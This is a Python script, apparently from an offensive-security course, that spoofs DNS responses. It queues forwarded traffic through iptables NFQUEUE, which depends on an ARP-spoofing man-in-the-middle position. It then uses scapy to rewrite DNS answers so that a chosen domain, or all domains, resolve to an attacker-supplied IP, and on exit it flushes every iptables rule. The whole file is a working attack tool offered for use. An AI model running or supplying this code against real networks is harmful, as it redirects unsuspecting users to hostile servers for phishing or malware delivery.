#!/usr/bin/env python3

import optparse
import subprocess
import netfilterqueue
import scapy.all as scapy


def prepare_iptables():
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # works with arp_spoofer

    # subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True) # if you want to test on your local machine
    # subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True) # if you want to test on your local machine

def get_options():
    parser = optparse.OptionParser()
    parser.add_option("-d", "--domain", dest="domain", help="Enter here domain that you want to spoof. Put \"*\" to spoof all domains.")
    parser.add_option("-i", "--destination-ip", dest="dst_ip", help="Enter here an IP address that you want to bind with entered domain.")
    options = parser.parse_args()[0]

    if not options.domain:
        parser.error("\033[91m[-] Please specify a domain name. Use --help for more info.")
    elif not options.dst_ip:
        parser.error("\033[91m[-] Please specify a destination ip address. Use --help for more info.")
    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if options.domain == "*" or options.domain in qname.decode():
            print(f"\033[1;32;40m[+] Spoofing {qname.decode()} to {options.dst_ip}")

            answer = scapy.DNSRR(rrname=qname, rdata=options.dst_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

def restore():
    print("\n\033[1;35;40m[+] Detected CTRL + C. Quiting.... Please wait!")
    subprocess.call("iptables --flush", shell=True)


prepare_iptables()
options = get_options()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    restore()
